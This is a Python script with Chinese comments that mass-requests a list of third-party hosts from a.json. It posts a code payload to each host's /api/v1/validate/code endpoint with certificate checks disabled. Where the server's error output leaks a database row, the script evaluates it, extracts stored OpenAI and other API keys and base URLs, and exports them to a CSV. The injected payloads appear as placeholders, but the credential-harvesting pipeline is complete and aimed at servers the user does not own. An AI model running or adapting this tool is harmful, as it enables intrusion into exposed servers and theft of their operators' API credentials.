"""
从 a.json 中批量请求 API 端点，解析响应并提取 API 凭据，导出为 CSV。
"""

import ast
import datetime
import json
import logging
from pathlib import Path

import pandas as pd
import requests
import urllib3

# 抑制 SSL 不验证时的警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)

# ── 常量 ──────────────────────────────────────────────
INPUT_FILE = Path("a.json")
OUTPUT_DIR = Path("data")
OUTPUT_CSV = Path("api_credentials.csv")
REQUEST_TIMEOUT = 10
MAX_ITEMS = 5  # 最多处理条数，设为 None 表示不限制
HEADERS = {"Content-Type": "application/json"}


def load_links(filepath: Path) -> list[dict]:
    """逐行读取 JSON 文件，每行一个 JSON 对象。"""
    records: list[dict] = []
    with open(filepath, "r", encoding="utf-8") as f:
        for lineno, line in enumerate(f, start=1):
            line = line.strip()
            if not line:
                continue
            try:
                records.append(json.loads(line))
            except json.JSONDecodeError as exc:
                logger.warning("第 %d 行 JSON 解析失败: %s", lineno, exc)
    return records


def post_validate(url: str, code: str) -> requests.Response | None:
    """发送 POST 请求并返回 Response，失败返回 None。"""
    payload = {"code": code}
    try:
        resp = requests.post(
            url,
            json=payload,
            headers=HEADERS,
            verify=False,
            timeout=REQUEST_TIMEOUT,
        )
        resp.raise_for_status()
        return resp
    except requests.RequestException as exc:
        logger.error("请求失败: %s — %s", url, exc)
        return None


def parse_response_json(resp: requests.Response, url: str) -> dict | None:
    """解析响应 JSON，失败返回 None。"""
    try:
        return resp.json()
    except json.JSONDecodeError as exc:
        logger.error("JSON 解析错误: %s — %s\n响应内容: %s", url, exc, resp.text[:200])
        return None


def save_response(ip: str, data: dict) -> None:
    """将单条响应保存到 data/<ip>.json。"""
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
    output_path = OUTPUT_DIR / f"{ip}.json"
    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)


def extract_credentials(records_tuple: tuple) -> list[dict]:
    """从解析后的元组列表中提取 API 凭据。"""
    credentials: list[dict] = []
    for item in records_tuple:
        # 跳过非序列或长度不足的元素
        if not isinstance(item, (tuple, list)) or len(item) < 6:
            logger.debug("跳过无效元素: %s", repr(item)[:100])
            continue
        name = item[0]
        config_str = item[5]
        try:
            config = json.loads(config_str)
            api_key = config.get("openai_api_key", config.get("api_key", ""))
            base_url = config.get("openai_api_base", config.get("base_url", ""))
            credentials.append({
                "模型名称 (Model)": name,
                "API Key": api_key,
                "Base URL": base_url,
            })
        except (json.JSONDecodeError, IndexError, TypeError) as exc:
            logger.debug("解析 config 失败 (name=%s): %s", name, exc)
    return credentials


def process_link(link_info: dict, index: int) -> list[dict]:
    """处理单条链接，返回提取到的凭据列表。"""
    url = f"{link_info.get('link')}/api/v1/validate/code"
    ip = link_info.get("ip", f"unknown_{index}")
    logger.info("(%d) 正在请求: %s", index, url)

    # 第一次请求
    resp = post_validate(url, code="ccc")
    if resp is None:
        return []

    resp_data = parse_response_json(resp, url)
    if resp_data is None:
        return []

    save_response(ip, resp_data)

    # 解析 error 字段
    try:
        error_str: str = resp_data["data"]["function"]["errors"][0]
    except (KeyError, IndexError, TypeError) as exc:
        logger.warning("(%d) 解析 errors 字段失败: %s — 响应: %s", index, exc, resp_data)
        return []

    # 如果缺少模块，用备用 payload 再请求一次
    if error_str.startswith("No module named"):
        retry_resp = post_validate(url, code="dddd")
        if retry_resp is not None:
            retry_data = parse_response_json(retry_resp, url)
            if retry_data is not None:
                try:
                    error_str = retry_data["data"]["function"]["errors"][0]
                except (KeyError, IndexError, TypeError):
                    pass

    if not error_str.startswith("DB_QUERY_OK:"):
        logger.info("(%d) 未命中 DB_QUERY_OK，跳过", index)
        return []

    tuple_str = error_str.removeprefix("DB_QUERY_OK:")

    # 使用受限 eval：仅暴露 datetime，禁止所有内置函数
    safe_globals = {"__builtins__": {}, "datetime": datetime}
    try:
        parsed_tuple = eval(tuple_str, safe_globals)  # noqa: S307
    except Exception as exc:
        logger.error("(%d) eval 解析失败: %s", index, exc)
        return []

    return extract_credentials(parsed_tuple)


def main() -> None:
    links = load_links(INPUT_FILE)
    logger.info("共加载 %d 条链接", len(links))

    all_credentials: list[dict] = []

    for idx, link_info in enumerate(links, start=1):
        credentials = process_link(link_info, idx)
        all_credentials.extend(credentials)

        if MAX_ITEMS is not None and idx >= MAX_ITEMS:
            logger.info("已达到最大处理数 (%d)，停止", MAX_ITEMS)
            break

    if all_credentials:
        df = pd.DataFrame(all_credentials)
        df.to_csv(OUTPUT_CSV, index=False, encoding="utf-8-sig")
        logger.info("已导出 %d 条记录到 %s", len(all_credentials), OUTPUT_CSV)
        print(df.to_string(index=False))
    else:
        logger.warning("未提取到任何凭据")


if __name__ == "__main__":
    main()